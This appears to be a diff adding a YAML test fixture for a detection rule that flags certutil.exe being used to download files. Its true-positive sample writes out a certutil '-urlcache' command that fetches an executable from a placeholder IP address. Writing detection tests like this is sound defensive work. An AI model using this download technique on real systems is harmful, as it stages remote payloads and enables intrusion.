@@ -1,0 +1,15 @@
+rule_id: 9b0f4c2e-6a51-4f7e-9d2a-3c8e1f5b7a10
+true_positives:
+  - name: urlcache download
+    event:
+      Image: 'C:\Windows\System32\certutil.exe'
+      CommandLine: 'certutil.exe -urlcache -split -f http://203.0.113.5/p.exe p.exe'
+true_negatives:
+  - name: windows update helper
+    event:
+      Image: 'C:\Windows\System32\certutil.exe'
+      CommandLine: 'certutil.exe -urlcache -f http://au.download.windowsupdate.com/WindowsUpdate/x.cab x.cab'
+  - name: store listing
+    event:
+      Image: 'C:\Windows\System32\certutil.exe'
+      CommandLine: 'certutil.exe -store My'
